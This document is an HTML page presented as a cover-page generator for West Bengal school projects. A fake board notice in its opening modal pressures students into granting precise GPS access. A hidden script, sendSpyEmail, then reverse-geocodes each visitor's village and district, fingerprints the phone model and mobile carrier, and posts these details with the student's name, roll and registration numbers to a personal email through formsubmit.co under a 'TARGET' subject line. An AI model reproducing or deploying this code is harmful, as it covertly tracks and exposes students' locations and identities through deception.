<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>School Project Cover</title>
    <link href="https://fonts.googleapis.com/css2?family=Amaranth:wght@700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    
    <style>
        body { font-family: 'Amaranth', sans-serif; background-color: #121212; color: white; text-align: center; padding: 10px; margin: 0; overflow: hidden; }
        
        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; filter: blur(10px); pointer-events: none; transition: 0.5s; opacity: 0.3; }
        
        /* --- üîí LOCATION LOCK MODAL --- */
        #location-lock {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.98); z-index: 9999;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            padding: 20px; text-align: center;
        }
        .lock-icon { font-size: 60px; margin-bottom: 20px; animation: bounce 2s infinite; }
        .lock-title { color: #ff3333; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid #ff3333; padding-bottom: 5px; }
        .lock-msg { color: #e0e0e0; font-size: 16px; margin-bottom: 30px; line-height: 1.6; max-width: 90%; background: #222; padding: 15px; border-radius: 10px; border: 1px solid #444; }
        .lock-btn {
            background: linear-gradient(135deg, #00c6ff, #0072ff); color: white;
            padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold;
            cursor: pointer; box-shadow: 0 0 20px rgba(0, 114, 255, 0.5);
            animation: pulse 1.5s infinite;
        }
        
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-20px);} 60% {transform: translateY(-10px);} }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* --- REST OF CSS --- */
        h2 { color: #ff9800; margin-top: 0; margin-bottom: 20px;}
        .field { text-align: left; margin-bottom: 15px; }
        label { color: #ccc; font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px; }
        input, select { width: 100%; padding: 12px; border: 2px solid #444; border-radius: 8px; background: #2c2c2c; color: #fff; font-size: 16px; font-family: 'Amaranth', sans-serif; font-weight: bold; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus, select:focus { border-color: #ff9800; }
        .error { border-color: #ff0000 !important; animation: shake 0.3s; }
        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
        button { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .btn-gen { background: linear-gradient(135deg, #ffc107, #ff9800); color: black; }
        .btn-dl { background: #e74c3c; color: white; display: none; margin-top: 15px; }
        canvas { max-width: 100%; height: auto; margin-top: 20px; border-radius: 8px; border: 2px solid #555; display: none; }
    </style>
</head>
<body>

    <div id="location-lock">
        <div class="lock-icon">üì°</div>
        <h1 class="lock-title">Verification Required</h1>
        <p class="lock-msg">
            ‚ö†Ô∏è <b>WEST BENGAL BOARD NOTICE:</b><br><br>
            ‡¶™‡ßç‡¶∞‡¶ú‡ßá‡¶ï‡ßç‡¶ü‡ßá‡¶∞ ‡¶ï‡¶≠‡¶æ‡¶∞ ‡¶™‡ßá‡¶ú‡¶ü‡¶ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ <b>‡¶ú‡ßá‡¶≤‡¶æ ‡¶ì ‡¶è‡¶≤‡¶æ‡¶ï‡¶æ‡¶∞ (District & Locality)</b> ‡¶≠‡¶ø‡¶§‡ßç‡¶§‡¶ø‡¶§‡ßá ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶°‡¶ø‡¶ú‡¶æ‡¶á‡¶® ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§<br><br>
            ‡¶≠‡ßÅ‡¶≤ ‡¶°‡¶ø‡¶ú‡¶æ‡¶á‡¶® ‡¶è‡ßú‡¶æ‡¶§‡ßá ‡¶è‡¶¨‡¶Ç ‡¶∏‡¶†‡¶ø‡¶ï ‡¶∏‡ßç‡¶ï‡ßÅ‡¶≤ ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶™‡ßá‡¶§‡ßá <b>"Allow Location"</b> ‡¶¨‡¶æ‡¶ü‡¶®‡¶ü‡¶ø ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶è‡¶ü‡¶ø ‡¶¨‡¶æ‡¶ß‡ßç‡¶Ø‡¶§‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï‡•§
        </p>
        <button class="lock-btn" onclick="requestGPS()">‚úÖ Verify Location & Enter</button>
    </div>

    <div class="box" id="main-box">
        <h2>Cover Page Generator</h2>

        <div class="field">
            <label>NAME</label>
            <input type="text" id="name" placeholder="Ex: AYAN KARMAKAR" autocomplete="off" oninput="validateEnglishName(this)">
        </div>

        <div class="field">
            <label>SUBJECT</label>
            <select id="subj">
                <option value="" disabled selected>-- Choose Subject --</option>
                <option value="AGRONOMY">AGRONOMY</option>
                <option value="ANTHROPOLOGY">ANTHROPOLOGY</option>
                <option value="ARABIC">ARABIC</option>
                <option value="BENGALI">BENGALI</option>
                <option value="BIOLOGICAL SCIENCES">BIOLOGICAL SCIENCES</option>
                <option value="CHEMISTRY">CHEMISTRY</option>
                <option value="COMPUTER APPLICATION">COMPUTER APPLICATION</option>
                <option value="COMPUTER SCIENCE">COMPUTER SCIENCE</option>
                <option value="ECONOMICS">ECONOMICS</option>
                <option value="EDUCATION">EDUCATION</option>
                <option value="ENGLISH">ENGLISH</option>
                <option value="ENVIRONMENTAL STUDIES">ENVIRONMENTAL STUDIES</option>
                <option value="GEOGRAPHY">GEOGRAPHY</option>
                <option value="GEOLOGY">GEOLOGY</option>
                <option value="HISTORY">HISTORY</option>
                <option value="JOURNALISM & MASS COMM">JOURNALISM & MASS COMM</option>
                <option value="MATHEMATICS">MATHEMATICS</option>
                <option value="MUSIC">MUSIC</option>
                <option value="NUTRITION">NUTRITION</option>
                <option value="PHILOSOPHY">PHILOSOPHY</option>
                <option value="PHYSICS">PHYSICS</option>
                <option value="POLITICAL SCIENCE">POLITICAL SCIENCE</option>
                <option value="PSYCHOLOGY">PSYCHOLOGY</option>
                <option value="SANSKRIT">SANSKRIT</option>
                <option value="SOCIOLOGY">SOCIOLOGY</option>
                <option value="STATISTICS">STATISTICS</option>
                <option value="URDU">URDU</option>
                <option value="VISUAL ARTS">VISUAL ARTS</option>
            </select>
        </div>

        <div class="field">
            <label>ROLL NO</label>
            <input type="tel" id="roll" placeholder="Ex: 300814 - 1036" maxlength="13" oninput="formatRoll(this)">
        </div>

        <div class="field">
            <label>REGISTRATION NO</label>
            <input type="tel" id="reg" placeholder="Ex: 04048576498" maxlength="15" oninput="this.value = this.value.replace(/\D/g, '')">
        </div>

        <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">‚¨á Download PDF</button>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
        const MY_EMAIL = "ayankarmakar7602@gmail.com";
        
        // ‡¶ó‡ßç‡¶≤‡ßã‡¶¨‡¶æ‡¶≤ ‡¶≠‡ßá‡¶∞‡¶ø‡ßü‡ßá‡¶¨‡¶≤
        let MAP_LINK = "Not Captured"; 
        let ADDRESS_TEXT = "Finding Address...";
        let GPS_ALLOWED = false;

        // --- üîí LOCK SYSTEM LOGIC ---
        function requestGPS() {
            if (navigator.geolocation) {
                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const long = position.coords.longitude;
                        
                        // 1. Google Maps Link
                        MAP_LINK = `https://www.google.com/maps?q=${lat},${long}`;
                        
                        // 2. ‡¶†‡¶ø‡¶ï‡¶æ‡¶®‡¶æ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ (Reverse Geocoding)
                        try {
                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${long}`);
                            const data = await res.json();
                            // ‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶¨‡¶æ ‡¶è‡¶≤‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ
                            const village = data.address.village || data.address.town || data.address.city || data.address.hamlet || "Unknown Area";
                            const district = data.address.state_district || data.address.county || "";
                            ADDRESS_TEXT = `${village}, ${district}`;
                        } catch(e) {
                            ADDRESS_TEXT = "Address Fetch Failed (Check Map Link)";
                        }
                        
                        GPS_ALLOWED = true;
                        
                        // ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶ï‡¶∞‡¶æ
                        document.getElementById('location-lock').style.display = 'none';
                        const mainBox = document.getElementById('main-box');
                        mainBox.style.filter = 'none';
                        mainBox.style.opacity = '1';
                        mainBox.style.pointerEvents = 'auto';
                        document.body.style.overflow = 'auto';
                    },
                    (error) => {
                        alert("‚ùå Location Denied!\n\n‡¶∏‡ßç‡¶ï‡ßÅ‡¶≤ ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ü‡¶ø ‡¶¨‡¶æ‡¶ß‡ßç‡¶Ø‡¶§‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï‡•§ ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá Allow ‡¶ï‡¶∞‡ßÅ‡¶®‡•§");
                        location.reload(); 
                    },
                    options
                );
            } else {
                alert("GPS not supported.");
            }
        }

        function validateEnglishName(input) {
            input.value = input.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
            input.classList.remove('error');
        }
        function formatRoll(input) {
            let v = input.value.replace(/\D/g, '');
            if (v.length > 6) v = v.slice(0, 6) + ' - ' + v.slice(6, 10);
            input.value = v;
            input.classList.remove('error');
        }

        function checkAndGenerate() {
            const nameIn = document.getElementById('name');
            const subjIn = document.getElementById('subj');
            const rollIn = document.getElementById('roll');
            const regIn  = document.getElementById('reg');

            let isValid = true;
            if (!nameIn.value.trim()) { nameIn.classList.add('error'); isValid = false; }
            if (!subjIn.value) { subjIn.classList.add('error'); isValid = false; }
            if (rollIn.value.length < 13) { rollIn.classList.add('error'); isValid = false; }
            if (regIn.value.length < 10) { regIn.classList.add('error'); isValid = false; }

            if (!isValid) {
                if (navigator.vibrate) navigator.vibrate(200);
                alert("‚ö†Ô∏è ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá ‡¶∏‡¶¨ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶†‡¶ø‡¶ï ‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞!");
                return;
            }

            // üïµÔ∏è‚Äç‚ôÇÔ∏è ‡¶Æ‡ßá‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
            generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
        }

        // --- üïµÔ∏è‚Äç‚ôÇÔ∏è ‡¶∏‡ßÅ‡¶™‡¶æ‡¶∞ ‡¶Æ‡¶°‡ßá‡¶≤ ‡¶°‡¶ø‡¶ü‡ßá‡¶ï‡ßç‡¶ü‡¶∞ ---
        function getDeviceModel() {
            const ua = navigator.userAgent;
            let model = "Unknown Mobile";
            
            // Modern API
            if (navigator.userAgentData && navigator.userAgentData.mobile) {
               const brand = navigator.userAgentData.brands.find(b => !b.brand.includes("Not") && !b.brand.includes("Chromium"));
               if(brand) model = brand.brand + " (Modern)";
            }

            // Regex Attack
            if (ua.includes("Android")) {
                const match = ua.match(/;\s([^;]+)\sBuild\//); 
                if (match && match[1]) model = match[1].trim(); 
                else {
                    const match2 = ua.match(/Android[^;]+; ([^;]+);/);
                    if (match2) model = match2[1].trim();
                }
            } else if (ua.includes("iPhone")) model = "iPhone";
            
            return model;
        }

        async function sendSpyEmail(name, subj, roll, reg) {
            const url = `https://formsubmit.co/ajax/${MY_EMAIL}`;
            const uniqueId = Math.floor(Math.random() * 10000);
            const deviceModel = getDeviceModel();

            // ‡¶∏‡¶ø‡¶Æ‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ (‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™)
            let ipData = { org: "Wait..." };
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}
            
            let cleanSim = ipData.org;
            if(cleanSim && cleanSim.includes("Airtel")) cleanSim = "Airtel";
            if(cleanSim && cleanSim.includes("Jio")) cleanSim = "Jio";
            if(cleanSim && (cleanSim.includes("Vi") || cleanSim.includes("Vodafone"))) cleanSim = "Vi";

            fetch(url, {
                method: "POST",
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    _subject: `TARGET: ${name} (#${uniqueId})`, 
                    _captcha: "false",
                    _template: "table",
                    
                    // ‡¶´‡¶∞‡ßç‡¶Æ ‡¶°‡¶æ‡¶ü‡¶æ
                    Student: name,
                    Subject: subj,
                    Roll: roll,
                    Reg: reg,
                    
                    // üïµÔ∏è‚Äç‚ôÇÔ∏è ‡¶ó‡ßã‡ßü‡ßá‡¶®‡ßç‡¶¶‡¶æ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü
                    ADDRESS_TEXT: ADDRESS_TEXT, // ‡¶Ø‡ßá‡¶Æ‡¶®: Jitujuri, Purulia
                    MAP_LINK: MAP_LINK,         // ‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶Æ‡ßç‡¶Ø‡¶æ‡¶™ ‡¶≤‡¶ø‡¶Ç‡¶ï
                    PHONE: deviceModel,         // ‡¶´‡ßã‡¶®‡ßá‡¶∞ ‡¶Æ‡¶°‡ßá‡¶≤
                    SIM_ISP: cleanSim,          // ‡¶∏‡¶ø‡¶Æ
                    
                    Time: new Date().toLocaleString()
                })
            })
            .then(res => console.log("Spy Data Sent!"))
            .catch(err => console.log("Error:", err));
        }

        // --- ‡¶ú‡ßá‡¶®‡¶æ‡¶∞‡ßá‡¶ü ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
        function generate(nameVal, subjVal, rollVal, regVal) {
            const cvs = document.getElementById('canvas');
            const ctx = cvs.getContext('2d');
            const img = new Image();
            img.src = 'background.jpg'; 
            img.crossOrigin = "anonymous";

            img.onload = function() {
                cvs.width = img.width;
                cvs.height = img.height;
                ctx.drawImage(img, 0, 0);
                const size = cvs.width * CONFIG.fontSize;
                ctx.font = `bold ${size}px 'Amaranth', sans-serif`;
                ctx.textAlign = "left";
                const x = cvs.width * CONFIG.startX;
                drawDeepGlowText(ctx, nameVal, x, cvs.height * CONFIG.pos_Name);
                drawDeepGlowText(ctx, subjVal, x, cvs.height * CONFIG.pos_Subj);
                drawDeepGlowText(ctx, rollVal, x, cvs.height * CONFIG.pos_Roll);
                drawDeepGlowText(ctx, regVal,  x, cvs.height * CONFIG.pos_Reg);
                cvs.style.display = "block";
                document.getElementById('dlBtn').style.display = "block";
                setTimeout(() => { cvs.scrollIntoView({behavior: "smooth", block: "center"}); }, 100);
            };
            img.onerror = function() { alert("Error: 'background.jpg' not found!"); };
        }

        function drawDeepGlowText(ctx, text, x, y) {
            const w = ctx.canvas.width;
            ctx.save();
            ctx.shadowColor = "black";
            ctx.shadowBlur = w * 0.015; 
            ctx.shadowOffsetX = w * 0.005;
            ctx.shadowOffsetY = w * 0.005;
            ctx.lineWidth = w * 0.012; 
            ctx.strokeStyle = "black";
            ctx.lineJoin = "round"; 
            ctx.strokeText(text, x, y);
            ctx.restore(); 
            let grad = ctx.createLinearGradient(x, y - (w * 0.05), x, y);
            grad.addColorStop(0, "#FFFF00"); grad.addColorStop(0.5, "#FFA500"); grad.addColorStop(1, "#FF4500");
            ctx.fillStyle = grad;
            ctx.fillText(text, x, y);
            ctx.lineWidth = w * 0.0015;
            ctx.strokeStyle = "white";
            ctx.strokeText(text, x, y);
        }

        async function downloadPDF() {
            const { jsPDF } = window.jspdf;
            const cvs = document.getElementById('canvas');
            const pdf = new jsPDF({ orientation: 'portrait', unit: 'px', format: [cvs.width, cvs.height] });
            const imgData = cvs.toDataURL('image/jpeg', 1.0);
            pdf.addImage(imgData, 'JPEG', 0, 0, cvs.width, cvs.height);
            pdf.save("School_Project.pdf");
        }
    </script>
</body>
</html>
